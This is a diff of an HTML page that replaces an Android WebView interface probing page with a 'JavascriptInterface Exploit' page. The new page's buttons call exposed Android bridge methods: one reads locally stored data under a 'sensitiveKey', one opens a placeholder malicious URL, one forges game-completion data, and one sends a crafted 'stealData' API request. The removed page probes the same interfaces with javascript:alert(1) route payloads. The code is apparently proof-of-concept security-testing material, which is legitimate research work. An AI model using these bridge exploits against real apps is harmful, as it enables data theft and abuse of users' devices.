@@ -1,136 +1,59 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>WebView Interface Testing</title>
-    <style>
-        .button {
-            margin: 10px;
-            padding: 8px 16px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JavascriptInterface Exploit</title>
+    <script>
+        // Trigger emptyLoaded
+        function exploitEmptyLoaded() {
+            Android.emptyLoaded();
+            alert('Exploit triggered: emptyLoaded');
         }
-        #output {
-            margin: 10px;
-            padding: 10px;
-            border: 1px solid #ccc;
-            min-height: 100px;
-            font-family: monospace;
+
+        // Trigger gameComplete with a crafted input
+        function exploitGameComplete() {
+            const craftedData = "CraftedData";
+            Android.gameComplete(craftedData);
+            alert(`Exploit triggered: gameComplete with data: ${craftedData}`);
         }
-        .error { color: red; }
-        .success { color: green; }
-    </style>
+
+        // Steal local data using gameInstanceGetLocalData
+        function exploitGameInstanceGetLocalData() {
+            const key = "sensitiveKey";
+            const localData = Android.gameInstanceGetLocalData(key);
+            alert(`Exploit triggered: gameInstanceGetLocalData with key: ${key}, data: ${localData}`);
+        }
+
+        // Exploit openUrl to open a malicious link
+        function exploitOpenUrl() {
+            const maliciousUrl = "http://malicious.com";
+            Android.openUrl(maliciousUrl);
+            alert(`Exploit triggered: openUrl with URL: ${maliciousUrl}`);
+        }
+
+        // Trigger vibration via vibrate
+        function exploitVibrate() {
+            const vibrationPattern = [100, 200, 300];
+            Android.vibrate(vibrationPattern);
+            alert(`Exploit triggered: vibrate with pattern: ${vibrationPattern}`);
+        }
+
+        // Send crafted API request using sendApiRequest
+        function exploitSendApiRequest() {
+            const craftedRequest = '{"action":"stealData","data":"sensitiveInfo"}';
+            Android.sendApiRequest(craftedRequest);
+            alert(`Exploit triggered: sendApiRequest with request: ${craftedRequest}`);
+        }
+    </script>
 </head>
 <body>
-    <h2>WebView Interface Testing</h2>
-    
-    <h3>Game Interface Tests:</h3>
-    <button class="button" onclick="checkInterfaces()">Check Available Interfaces</button>
-    <button class="button" onclick="testGameInterface()">Test Game Interface</button>
-    
-    <h3>Engine Interface Tests:</h3>
-    <button class="button" onclick="testRouteChange()">Test Route Change</button>
-    <button class="button" onclick="testTapAction()">Test Tap Action</button>
-    <button class="button" onclick="testSizeChange()">Test Size Change</button>
-    <button class="button" onclick="testError()">Test Error</button>
-
-    <h3>Output:</h3>
-    <div id="output"></div>
-
-    <script>
-        const possibleInterfaces = [
-            'GameJSInterface',
-            'EngineWebViewInterface',
-            'Android',
-            'game'
-        ];
-
-        function log(message, isError = false) {
-            const output = document.getElementById('output');
-            output.innerHTML = `<div class="${isError ? 'error' : 'success'}">${new Date().toLocaleTimeString()} - ${message}</div>` + output.innerHTML;
-        }
-
-        function checkInterfaces() {
-            log("Checking available interfaces...");
-            possibleInterfaces.forEach(interfaceName => {
-                if (window[interfaceName]) {
-                    log(`Found interface: ${interfaceName}`, false);
-                    for(let prop in window[interfaceName]) {
-                        log(`- Method: ${prop}`, false);
-                    }
-                }
-            });
-        }
-
-        function testGameInterface() {
-            try {
-                if (window.GameJSInterface) {
-                    window.GameJSInterface.sendApiRequest('{"test": "payload"}');
-                    window.GameJSInterface.event("test_event", "test_data");
-                    log("Game interface tests sent");
-                } else {
-                    log("GameJSInterface not found", true);
-                }
-            } catch(e) {
-                log(`Error in game interface: ${e.message}`, true);
-            }
-        }
-
-        // Engine Interface Tests
-        function sendEngineMessage(method, params) {
-            try {
-                const message = {
-                    gist: {
-                        method: method,
-                        parameters: params
-                    }
-                };
-                
-                if (window.EngineWebViewInterface) {
-                    window.EngineWebViewInterface.postMessage(JSON.stringify(message));
-                    log(`Sent ${method} message`);
-                } else {
-                    log("EngineWebViewInterface not found", true);
-                }
-            } catch(e) {
-                log(`Error sending ${method}: ${e.message}`, true);
-            }
-        }
-
-        function testRouteChange() {
-            sendEngineMessage("routeChanged", {
-                "route": "javascript://alert(1)"
-            });
-        }
-
-        function testTapAction() {
-            sendEngineMessage("tap", {
-                "name": "test_tap",
-                "action": "javascript:alert(1)",
-                "system": true
-            });
-        }
-
-        function testSizeChange() {
-            sendEngineMessage("sizeChanged", {
-                "width": 1337,
-                "height": 1337
-            });
-        }
-
-        function testError() {
-            sendEngineMessage("error", {});
-            sendEngineMessage("routeError", {
-                "route": "javascript:alert(1)"
-            });
-        }
-
-        // Run interface check on page load
-        window.onload = function() {
-            checkInterfaces();
-            log("Page loaded successfully");
-        };
-    </script>
+    <h1>JavascriptInterface Exploit Page</h1>
+    <button onclick="exploitEmptyLoaded()">Exploit emptyLoaded</button><br><br>
+    <button onclick="exploitGameComplete()">Exploit gameComplete</button><br><br>
+    <button onclick="exploitGameInstanceGetLocalData()">Exploit gameInstanceGetLocalData</button><br><br>
+    <button onclick="exploitOpenUrl()">Exploit openUrl</button><br><br>
+    <button onclick="exploitVibrate()">Exploit Vibrate</button><br><br>
+    <button onclick="exploitSendApiRequest()">Exploit sendApiRequest</button>
 </body>
 </html>
